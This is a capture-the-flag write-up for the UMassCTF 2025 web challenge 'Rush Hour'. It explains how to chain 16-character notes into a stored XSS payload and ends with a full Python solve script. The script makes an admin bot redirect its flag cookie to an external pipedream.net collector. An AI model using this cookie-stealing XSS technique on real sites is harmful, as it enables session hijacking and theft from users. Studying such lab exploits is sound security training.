---
title: "Rush Hour - UMassCTF 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "rush", "hour", "umassctf", "umassctf-2025", "2025", "ctf-writeup"]
summary: "The web application consists of our dashboard (as our user), where we're able to upload text of at most 16 characters."
source:
  name: "CTFtime writeup #40168"
  url: "https://ctftime.org/writeup/40168"
ctf:
  name: "UMassCTF 2025"
  year: 2025
  challenge: "Rush Hour"
---

## Metadata

- **CTF:** UMassCTF 2025
- **Task:** Rush Hour
- **Author team:** twosheep
- **CTFtime tags:** xss
- **CTFtime:** <https://ctftime.org/writeup/40168>

---
The web application consists of our dashboard (as our user), where we're able to upload text of at most 16 characters. There is also an admin bot that we can query to view our dashboard.

When we upload a "note" to the dashboard, it is vulnerable to XSS. Although, with the strict limitation of 16 characters posing an issue, we cannot submit a single whole XSS payload.

What we can do to bypass this is, since each note is treated as a list item with the corresponding `

* a
` elements, we can wrap them around in quotes ("`
* `"). This means that the javasacript won't get interrupted by those tags (since you *can* have strings just lying around in javascript). Each line of code in our javascript payload, because of this, will have to be (16-2-2 == 12) characters, but we *will* be able to have a javascript payload this way. 

Now, when it comes to the admin bot, there are a couple things worthy of mention:  
1\. CORs makes it so we cant utilize `fetch()` or any of the javascript HTTP functions. We can bypass this by using an image tag.  
2\. The flag is set as a cookie, but is only set when the admin goes to read *their own* notes.  
3\. When we make the admin bot create a note, it doesn't automatically redirect it back to it's dashboard; so we can't simply use `window.location = x` since the bot will get stuck at the "note created" screen.

So, what we do is the following:  
1\. We'll query the initial `/report` endpoint with some data using `document.hash`, to get around the 12-character-per-line limitation as mentioned above. This wasn't entirely necessary since later on (as can be seen) I needed to do this for multiple other pieces of data, but it was my initial idea that I kept around. I also cleverly used the 12 character limitation to perform `substr` with the length of `

* `, since a full instruction of `substr(x)` would've passed the character limit of 12.  
2\. If the hash is not empty (it's our first time the bot looked at our dashboard), we'll utilize `img.src` to query the `/create` endpoint. The admin will create an XSS payload that, upon execution, redirects them back to the previous page using `history.back()`. However, by doing this, the admin will now have the cookie containing the flag. Along with this, we'll make sure to set the hash to blank for step #3.  
3\. If the hash *is* blank (aka: it did the thing above), then it means using the logic above, it's the same to if the admin viewed the dashboard for the first time *but now with the flag cookie set*. This means we can then just set `window.location = "url_we_control" + document.cookie`, to make the admin query our external site with all it's cookie values including the flag.  
4\. Win. 

```python  
from requests import session  
from urllib.parse import quote

url = "<http://rush-hour.ctf.umasscybersec.org>"  
cookie_grabber = "[eov97qyucmb7qi8.m.pipedream.net/](http://eov97qyucmb7qi8.m.pipedream.net/)"

#get our user identity  
s = session()  
user = s.get(url).url[len(url+"/user/"):]  
print(user)

#generate our payload  
def send_note(msg):  
assert(len(msg) <= 16)  
[s.post](http://s.post)(f"{url}/create", data={"note": msg}).text

#the image  
send_note("")

#generate the XSS  
send_note("<script>\"")  
send_note("\";q=location;\"")  
send_note("\";d=console;\"")

#image finished loading; refresh page  
send_note("\";function t(){\"")  
send_note("\";location='/'}\"")

#get the cookie  
send_note("\";x=document;\"")  
send_note("\";y=x.cookie;\"")

#get the hash and the url to send cookies too  
send_note("\";b=q.hash;\"")  
send_note("\";w=q.search;\"")  
send_note("\";j=b.length;\"")  
send_note("\";d.log(j);\"")

#http prefix  
send_note("\";z='https://';\"")  
send_note("\";k='http://';\"")

#handle going to the cookie grabber site  
send_note("\";if(j==0){\"")

#add the site to query  
send_note(f"\";n='{cookie_grabber[0]}';\"")  
for c in cookie_grabber[1:]:  
send_note(f"\";n+='{c}';\"")

send_note("\";w=z+n+y;\"")  
send_note("\";location=w;\"")  
send_note("\";alert(1)}\"")

#get the image  
send_note("\";v='getEleme';\"")  
send_note("\";v+='ntById';\"")  
send_note("\";p=x[v]('hi');\"")

#go to the location specified in the hash  
send_note("\";n=b.substr(\"")  
send_note("\".length);\"")  
send_note("\";r=n;\"")  
send_note("\";q.hash='';\"")  
send_note("\";w='127.0';\"")  
send_note("\";w+='.0.1';\"")  
send_note("\";w+=':3000';\"")  
send_note("\";w+='/';\"")  
send_note("\";r+='</scr';\"")  
send_note("\";r+='ipt>';\"")  
send_note("\";j=k+w+r;\"")

#finalize image  
send_note("\";p.src=j;\"")  
send_note("\";m=setTimeout;\"")  
send_note("\";m(t,500);\"")

send_note("\"</script>")

#now, if we want to send in code for admin to execute  
def send_code(code):  
print(s.get(f"{url}/report/{user}%23{'a'*8}{quote(code)}").text)

#update their notes  
send_code("create?note=<script>history.back()")  
```
